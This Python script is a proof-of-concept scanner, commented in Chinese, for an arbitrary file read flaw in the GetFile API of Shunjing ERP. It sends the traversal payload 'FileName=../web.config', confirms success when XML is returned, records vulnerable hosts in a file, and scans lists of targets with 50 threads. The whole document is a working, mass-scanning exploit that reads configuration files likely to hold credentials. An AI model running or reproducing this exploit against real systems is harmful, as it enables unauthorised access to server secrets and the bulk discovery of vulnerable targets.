#顺景ERP GetFile接口存在任意文件读取漏洞
#body="/api/DBRecord/getDBRecords"
import argparse,sys,requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
def banner():
    pass

def poc(target):
    payload = '/api/Download/GetFile?FileName=../web.config&Title=123'
    # 探测存活
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
}
    try:
        res1 = requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,headers=headers,timeout=5,verify=False)
            if res2.status_code == 200 and '<?xml version="1.0" encoding="utf-8"?>' in res2.text:
                print(f"[+]{target}存在漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f"[-]{target}不存在漏洞")
        else:
            print(f"[*]{target}访问出现问题，请手工测试")
    except:
        print(f"[-]{target}请求错误")

def main():
    # 定义
    parse = argparse.ArgumentParser(description="顺景ERP GetFile接口存在任意文件读取漏洞")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    # 实例化
    args = parse.parse_args()

    # 对用户的输入做判断 输入的url还是file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 开启多线程
        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
        mp = Pool(50) # 定义线程池的大小
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        print("[*] 所有URL测试完成")
    else:
        print(f"Usage:python {sys.argv[0]} -h")

# 定义函数的入口
if __name__ == '__main__':
    main()
